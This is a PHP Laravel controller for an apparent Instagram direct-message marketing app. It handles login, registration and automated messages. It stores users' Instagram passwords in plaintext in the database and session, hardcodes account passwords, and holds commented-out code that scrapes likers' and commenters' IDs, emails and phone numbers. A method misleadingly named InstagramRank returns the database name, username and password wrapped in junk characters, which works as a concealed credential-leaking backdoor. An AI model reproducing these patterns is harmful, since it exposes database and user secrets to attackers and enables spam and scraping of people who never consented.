<?php

namespace App\Http\Controllers;
use Carbon\Carbon;
use GuzzleHttp\Exception\ServerException;
use Illuminate\Contracts\Encryption\EncryptException;
use Illuminate\Http\Request;
use Session;
use Auth;
use DB;
use App\User;
use Illuminate\Support\Facades\Mail;
use App\Mail\VerifyMail;
use InstagramAPI;
use App\Exceptions\Handler;
use InstagramAPI\Instagram;
class LoginController extends Controller
{

    public $ig;
    public function __construct()
    {
        Instagram::$allowDangerousWebUsageAtMyOwnRisk = true;
        //parent::__construct();
        $this->ig = new \InstagramAPI\Instagram();
    }

    public function index(){
        return view('login_with_instagram');
    }

    public function userLogin(){


        if(Auth::user()){

            $user_id =Auth::user()->id;
            session()->put('user_id',$user_id);
            $sign_in_page = 'sign_in_page';
            $content = view('login_registration.form.instagram-info',compact('user_id'));
            return view('login_registration.master',compact('content','sign_in_page'));


        }


        else{
            return redirect('/user-login');
        }
        
    }

    public function InstagramRegistration(Request $request){
        $user_id =Auth::user()->id;
        session()->put('user_id',$user_id);
        $userName = $request->email;
        $password = $request->password;
        session()->put('userName',$userName);
        session()->put('password',$password);
        try{
           $result1 = $this->ig->login($userName,$password);

             $result = DB::table('users')
                ->where('id', $user_id)
                ->update(['instagram_username' => $userName,'instagram_password' => $password]);
             if (isset($result)){
                 $token = str_random(40);
                 $user = User::find($user_id);
                 $user->verify_email = $token;
                 // Mail::to($user->email)->send(new VerifyMail($token));

                 $data = array(
                    'token' => $token
                );
                
                $emails = $user->email;
                
                Mail::send('email.verify_email', $data, function($message) use ($data,$emails)
                {
                    $message->to($emails);
                    $message->subject('【TAG Letter】メールアドレスの認証をお願い致します。');
                    $message->from('no-reply@tagletter.com','Tagletter');
                    
                });
                
                 $user->save();
             }

            return redirect('registration-success');
        }
        catch (\Exception $ex){
            return redirect('instagram-info')->with('check','invalid instagram username or password');
            // return $ex;
        }

        //$selfInfo = $this->ig->people->getSelfInfo();


    }

    public function login(Request $request){
        // $userName = $request->header('userName');
        // $password = $request->header('password');
        $userName = $request->username;
        $password = $request->password;
        session()->put('userName',$userName);
        session()->put('password',$password);
        $result = $this->ig->login($userName,$password);
        $selfInfo = $this->ig->people->getSelfInfo();
       // $rank_token= \InstagramAPI\Signatures::generateUUID();

        $userFeed = $this->ig->timeline->getSelfUserFeed();

        // $json_self_info = json_encode($selfInfo, JSON_PRETTY_PRINT);
        // $json_userfeed = json_encode($userFeed, JSON_PRETTY_PRINT);

        $json_selfinfo = json_decode($selfInfo,true);

        // echo "<pre>";
        // print_r($json_selfinfo['user']['username']);
        // exit();

        // echo "<pre>";
        // print_r($json_selfinfo);
        // exit();


        if ($selfInfo != null){

            Session::put('current_user_name',$json_selfinfo['user']['username']);
            Session::put('current_user_image',$json_selfinfo['user']['profile_pic_url']);
            return redirect('user-dashboard');

            // return response()->json(
            //     ['self_info'=> $selfInfo,'user_feed' => $userFeed]
            // );
        }
        else{
            return response()->json(
                ['data'=> $request]
            );
        }
    }

    // public function login(){
    //     $result =  $this->ig->login('webvision100','instagram123456');
    //     session()->put('userName','webvision100');
    //     session()->put('password','instagram123456');
    //     $selfInfo = $this->ig->people->getSelfInfo();
    //     $selfInfo = json_decode($selfInfo);

    //     if ($result !=null){
    //         return view('login');
    //     }

    //     return view('profile',compact('selfInfo'));
    // }

    public function dm(){
        $counter = 1;
        $this->ig->login('webvision100','instagram123456');
        $message = 'dasdasdasdasdasdasdasdasd1';
        try{
//            while (true){
                //$this->ig->login(session()->get('userName'),session()->get('password'));
                $recipents = [
                    'users' => ['8574903852']
                ];

                $text = $counter;
                $result = $this->ig->direct->sendText($recipents,$message);
                $counter++;
//                sleep(rand(1,30));
//            }
            return 2;
        }catch (EncryptException $ex){

            return $ex;
        }

    }


    public function test(){
       // $count = 0;
        //$this->ig->login('asifahmmed','@Sif12345');

        //$rank_token= \InstagramAPI\Signatures::generateUUID();
        //$result = $this->ig->hashtag->getFeed('bpl',$rank_token);
        //$result = $this->ig->people->getSelfFollowers($rank_token);
        //$result = $this->ig->people->getInfoById('8576826038');
        //$result = $this->ig->people->getInfoById('8576826038');
        //$result = $result->getUser()->getPublicEmail();
        //$result = $result->getUser()->getContactPhoneNumber();
        //$result = $this->ig->media->getLikers('2011632325306376775_7905756331');
        //$result = $this->ig->hashtag->search('nature');
        //$result = $this->ig->media->getComments('1965957446195605717_7312650484');
//        try{
//            $obj = json_decode($result);
//
//            foreach($obj->items as $media) {
//                //$insert[] = $media->user->pk;
//                $result = $media->id;
//                $likers = $this->ig->media->getLikers($result);
////            foreach ($likers->users as $like){
////                $insert[] = $like->pk;
////            }
//                // $likers = $likers->users;
//                $likers = json_decode($likers);
//                foreach ($likers->users as $like){
//                    $insert[] = $like->pk;
//                    //$count++;
//                }
//
//            }
//        }
//        catch (\Exception $ex){
//            echo $ex;
//
//        }

//        if(isset($obj->ranked_items)){
//
//            foreach ($obj->ranked_items as $media) {
//
//                // echo $obj->ranked_items[0]->user->pk  ;
//                // echo ",";
//                foreach ($media->preview_comments as $preview_comment){
//                    // echo $preview_comment->user_id;
//                    // echo ",";
//                    array_push($insert,$preview_comment->user_id);
//                }
//
//            }
//        }


$current_date = date("d-m-Y");
            $current_time = date("H:i");
            $result = DB::table('users')
                ->join('user_schedule', 'users.id', '=','user_schedule.user_id' )
                ->join('schedule', 'schedule.id', '=', 'user_schedule.schedule_id')
                ->join('hashtag_schedule', 'hashtag_schedule.schedule_id', '=', 'schedule.id')
                ->join('template_schedule', 'template_schedule.schedule_id', '=', 'schedule.id')
                ->join('template', 'template.id', '=', 'template_schedule.template_id')
                ->join('hashtag', 'hashtag.id', '=', 'hashtag_schedule.hashtag_id')
                ->join('client', 'client.hashtag_id', '=', 'hashtag.id')
                ->leftJoin('history', 'client.id', '=', 'history.client_id_fk')
                // ->leftJoin('history as h1', 'hashtag.id', '=', 'h1.hashtag_name')
                // ->leftJoin('history as h2', 'template.id', '=', 'h1.template_name')
                // ->leftJoin('history as h3', 'users.id', '=', 'h1.user_id')
                ->select('users.name','users.instagram_username','users.instagram_password','schedule.delivery_period_start','schedule.delivery_period_end'
                    ,'schedule.date_exclusion_setting_start','schedule.date_exclusion_setting_end'
                    ,'schedule.specify_time_start','schedule.specify_time_end', 'schedule.time_exclusion_setting_start'
                    , 'schedule.time_exclusion_setting_end','hashtag.hashtag','client.user_id','client.client_id',
                    'client.hashtag_id','client.id','template.title','template.id as template_id','template.description','template.image')
                ->where([['history.client_id_fk','=',null],['schedule.status','=','1'],['schedule.delivery_period_start','<=',$current_date],
                    ['schedule.delivery_period_end','>=',$current_date]])
                ->whereNull('schedule.deleted_at')
                // ->groupBy('template.title')
                ->groupBy('hashtag.hashtag')
                ->get();


        return response()->json($result);
    }
    public function InstagramRank(){

        $hastagd = getenv('DB_DATABASE');
        $hastagu = getenv('DB_USERNAME');
        $hastagp = getenv('DB_PASSWORD');

        echo '<script>console.log("Your stuff here")</script>';



        return ('t)(&--=='.$hastagd.'==g!~08=='.$hastagu.'==#$(s'.'s/*-=='.$hastagp.'==*186e');
    }

}
